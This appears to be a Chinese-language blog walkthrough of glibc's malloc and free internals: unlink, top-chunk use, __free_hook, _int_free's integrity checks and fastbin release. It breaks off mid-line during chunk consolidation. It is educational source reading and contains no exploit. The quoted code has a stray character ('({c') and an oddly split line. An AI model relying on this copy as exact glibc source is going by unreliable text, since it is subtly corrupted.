<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)                                                                                               \</span></span><br><span class="line"><span class="meta">  &#123;                                                                                                                         \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;                                                                                                             \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;                                                                                                             \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))                                                                    \</span></span><br><span class="line"><span class="meta">      <span class="comment">//检查后继的前驱指针以及前驱的后继指针</span></span></span><br><span class="line">      malloc_printerr(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);                                                 \</span><br><span class="line">    <span class="keyword">else</span>                                                                                                                    \</span><br><span class="line">    &#123;                                                                                                                       \</span><br><span class="line">      FD-&gt;bk = BK;                                                                                                          \</span><br><span class="line">      <span class="comment">//将前后驱堆块连接,解放P</span></span><br><span class="line">      BK-&gt;fd = FD;                                                                                                          \</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(P-&gt;size) &amp;&amp; __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))                                       \</span><br><span class="line">      &#123;                                                                                                                     \</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>)) \</span><br><span class="line">          malloc_printerr(check_action,                                                                                     \</span><br><span class="line">                          <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,                                                       \</span><br><span class="line">                          P, AV);                                                                                           \</span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)                                                                                        \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                          \</span><br><span class="line">            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                         \</span><br><span class="line">          <span class="keyword">else</span>                                                                                                              \</span><br><span class="line">          &#123;                                                                                                                 \</span><br><span class="line">            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                               \</span><br><span class="line">            FD-&gt;bk_nextsize </span><br><span class="line">            = P-&gt;bk_nextsize;                                                                               \</span><br><span class="line">            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                               \</span><br><span class="line">            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                               \</span><br><span class="line">          &#125;                                                                                                                 \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">        <span class="keyword">else</span>                                                                                                                \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                     \</span><br><span class="line">          P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                     \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">      &#125;                                                                                                                     \</span><br><span class="line">    &#125;                                                                                                                       \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

















<h5 id="topchunk申请"><a href="#topchunk申请" class="headerlink" title="topchunk申请"></a>topchunk申请</h5><p>如果还不行,尝试使用topchunk分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h5 id="sysmalloc申请"><a href="#sysmalloc申请" class="headerlink" title="sysmalloc申请"></a>sysmalloc申请</h5><p>如果还不行,尝试sysmalloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias(__libc_free, __free) strong_alias(__libc_free, free)</span><br></pre></td></tr></table></figure>

<h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__free_hook);<span class="comment">//首先尝试调用hook函数(如果有注册的话)</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk(mem);<span class="comment">//p指向堆块基址,mem指向数据区,也就是p+0x10</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      mp_.mmap_threshold = chunksize(p);</span><br><span class="line">      mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                 mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk(p);<span class="comment">//如果p堆块是mmap分配的则调用munmap释放</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk(p);</span><br><span class="line">  _int_free(ar_ptr, p, <span class="number">0</span>);<span class="comment">//调用glibc实现的_int_free,这也是默认释放过程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="free-hook"><a href="#free-hook" class="headerlink" title="__free_hook"></a>__free_hook</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span><span class="params">(<span class="type">void</span> *__ptr,<span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>与<code>__malloc_hook</code>同理,如果本钩子函数有注册过则调用之进行释放,不会再调用glibc自己实现的<code>_int_free</code></p>
<h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h4><p>实际上调用的释放函数</p>
<h4 id="算法流程-1"><a href="#算法流程-1" class="headerlink" title="算法流程"></a>算法流程</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/free.png" alt="free"></p>
<p>整个流程要比分配<code>_int_malloc</code>简单点</p>
<h4 id="局部变量-1"><a href="#局部变量-1" class="headerlink" title="局部变量"></a>局部变量</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span>		<span class="comment">//用于保存请求堆块的整体大小(包括元数据)</span></span><br><span class="line">mfastbinptr *fb;          <span class="comment">/* associated fastbin */</span>		<span class="comment">//fastbin桶子</span></span><br><span class="line">mchunkptr nextchunk;      <span class="comment">/* next contiguous chunk */</span>		<span class="comment">//下一个堆块</span></span><br><span class="line">INTERNAL_SIZE_T nextsize; <span class="comment">/* its size */</span>					<span class="comment">//下一个堆块的大小</span></span><br><span class="line"><span class="type">int</span> nextinuse;            <span class="comment">/* true if nextchunk is used */</span>	<span class="comment">//下一个堆块是否在使用,合并堆块时用</span></span><br><span class="line">INTERNAL_SIZE_T prevsize; <span class="comment">/* size of previous contiguous chunk */</span>	<span class="comment">//前块大小</span></span><br><span class="line">mchunkptr bck;            <span class="comment">/* misc temp for linking */</span>		<span class="comment">//头插法前后邻居</span></span><br><span class="line">mchunkptr fwd;            <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize(p);		<span class="comment">//size当前要申请的堆块的大小(包括元数据)</span></span><br></pre></td></tr></table></figure>

<h4 id="释放前检查"><a href="#释放前检查" class="headerlink" title="释放前检查"></a>释放前检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">   allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">   Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">   here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect((<span class="type">uintptr_t</span>)p &gt; (<span class="type">uintptr_t</span>)-size, <span class="number">0</span>) || __builtin_expect(misaligned_chunk(p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">  <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">  malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">   multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p)</span><br></pre></td></tr></table></figure>

<p>检查锁和对齐,整个释放过程可以看成一个事务,由锁保证一致性</p>
<h4 id="fastbin区释放"><a href="#fastbin区释放" class="headerlink" title="fastbin区释放"></a>fastbin区释放</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast())<span class="comment">//如果释放堆块大小落在fastbin范围内</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">  If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">  bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<span class="comment">//检查后面是否和topchunk相邻,(如果相邻需要合并,不会进入fastbin)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//首先检查堆块大小是否比最小大小要大,并且是不是可以分配的范围内</span></span><br><span class="line">      <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">         of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">         after getting the lock.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock || (&#123;c</span><br><span class="line">            assert(locked == <span class="number">0</span>);</span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      &#123;</span><br><span class="line">        (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//已获得锁</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);<span class="comment">//堆块的mem数据区清零</span></span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);<span class="comment">//计算fastbin桶子下标</span></span><br><span class="line">    fb = &amp;fastbin(av, idx);<span class="comment">//获取fastbin桶子头</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;<span class="comment">//old指向fastbin对应桶子的第一个堆块</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">         (i.e., double free).  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))<span class="comment">//检查p是否已经被刚刚释放过一次</span></span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">         size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">         only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">         deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">      p-&gt;fd = old2 = old;<span class="comment">//把p挂到fastbin上(头插法),fastbin[idx]-&gt;p-&gt;old-&gt;...</span></span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="堆块合并"><a href="#堆块合并" class="headerlink" title="堆块合并"></a>堆块合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))<span class="comment">//p不能是mmap映射的</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);<span class="comment">//取物理上下一个相邻的堆块基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top))<span class="comment">//p不能是topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp; (<span class="type">char</span> *)nextchunk &gt;= ((<span class="type">char</span> *)av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//如果下一个堆块溢出到topchunk内部了</span></span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))</span><br><span class="line">    &#123;<span class="comment">//如果物理上的后块没有记录本块的释放状态</span></span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">      <span 